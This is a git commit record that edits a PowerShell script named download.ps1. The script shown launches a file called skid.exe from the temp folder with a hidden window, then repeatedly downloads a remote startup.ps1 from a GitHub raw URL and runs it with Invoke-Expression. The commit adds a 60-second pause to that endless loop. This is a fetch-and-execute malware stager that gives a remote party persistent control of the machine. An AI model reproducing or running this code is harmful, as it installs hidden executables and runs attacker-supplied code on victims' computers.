211a272e2b60994777e4dbbf3244e760fc8dfe69
43a1723 <hai1723notgay@gmail.com>
2024-06-13 08:03:49 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -48,4 +48,5 @@ Start-Process -FilePath "$temp\skid.exe" -WindowStyle Hidden
 $scriptContent = Invoke-WebRequest -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" -UseBasicParsing
 while ($true) {
     Invoke-Expression $scriptContent.Content
+    Start-Sleep -Seconds 60
 }
